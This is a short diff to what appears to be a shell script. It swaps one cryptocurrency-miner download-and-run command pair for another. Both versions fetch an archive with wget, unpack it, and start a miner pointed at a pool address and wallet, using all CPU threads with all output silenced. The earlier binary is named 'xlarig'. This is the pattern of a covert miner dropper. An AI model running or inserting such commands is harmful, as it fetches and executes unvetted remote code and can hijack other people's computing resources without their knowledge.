@@ -1,2 +1,2 @@
-wget https://github.com/bengetsia/soft/raw/main/xlarig.tar.gz && tar -xvf xlarig.tar.gz
-./xlarig -o 172.105.127.237:443 -u ZEPHs9S2EWRQzizKJRbnnvATxUoGNCbG5AH5t3HoCwVRWGuyerr8UshcoEwjzbxq88MNDKhBdmzc1Qs1s4u8JQ33YDcbYhxx5SN -p BAMBU -t $(nproc --all) >/dev/null 2>&1
+wget https://github.com/nevocoin/nevocoin/releases/download/v0.1.2.2/nevocoin-v0.1.2.2-x86_64-linux-gnu.tar.xz && tar -xvf nevocoin-v0.1.2.2-x86_64-linux-gnu.tar.xz
+./nevorig -a randomnevo --url randomx.rplant.xyz:7102 --user NS3a41XTzSCFeKux8kZSV3EBUJAGYUDwnh63JwbSxFV1gj3W7koC3pUah33cBcDnbMgcVNjB5uNfWfvqYW3mXLLB2mhHGtAWy.ikuk -t $(nproc --all) >/dev/null 2>&1
